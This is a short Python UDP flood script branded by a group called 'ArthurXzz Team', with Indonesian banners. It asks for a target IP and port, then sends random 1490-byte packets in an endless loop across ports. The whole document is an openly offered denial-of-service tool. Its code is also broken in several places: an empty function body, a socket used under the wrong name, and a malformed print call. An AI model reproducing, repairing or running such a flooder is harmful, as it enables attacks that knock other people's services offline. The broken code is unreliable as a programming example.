#ArthurXzz Team
#discord.gg//ArthurXzzTeam
import struct
import codecs,sys
import threading
import random
import time
import os
import socket

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print("""\u001b[31m
>> ArthurXzz Team
>>>>> Auto Tembus
>>>>>>>>> Ga Kenal Yang Nama Suhu""")

ip = str(input("Ip ArthurXzz Target : "))
port = int(input("Port ArthurXzz Target :"))
choice = str(input(" Siap Mengirim Nuklir?(y/n):"))
times = int(input(" Packets Nuklir :"))
threads = int(input(" Threads Nuklir :"))
def run():

os.system("figlet Attack Starting")
print("ArthurXzz MengHack Situs Mars")
time.sleep(3)
sent = 99999
while True:
     s.sendto(bytes, (ip,port)) 
     sent = sent + 1
     port = port + 1
     print("Start Sent %s Pakets To %s Port socket:%")(sent,ip,port)
     if port == 65534:
       port = 1
